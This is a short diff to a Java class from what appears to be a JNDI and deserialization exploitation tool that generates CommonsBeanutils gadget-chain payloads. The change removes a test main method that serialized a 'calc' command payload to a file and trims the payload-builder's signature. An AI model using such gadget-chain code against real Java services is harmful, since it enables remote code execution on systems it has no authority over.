@@ -3,16 +3,13 @@ package com.nu1r.jndi.gadgets;
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
 import com.nu1r.jndi.gadgets.utils.SuClassLoader;
-import com.nu1r.jndi.utils.Config;
 import com.sun.rowset.JdbcRowSetImpl;
 import javassist.ClassClassPath;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
 
-
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.math.BigInteger;
 import java.util.Comparator;
@@ -20,16 +17,9 @@ import java.util.PriorityQueue;
 
 public class CommonsBeanutils3183 {
 
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("333.ser");
-        fous.write(bytes);
-        fous.close();
-    }
-
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public static byte[] getBytes(PayloadType type) throws Exception {
         String command = String.valueOf(type);
-        String jndiURL = null;
+        String jndiURL;
         if (command.toLowerCase().startsWith("jndi:")) {
             jndiURL = command.substring(5);
         } else {
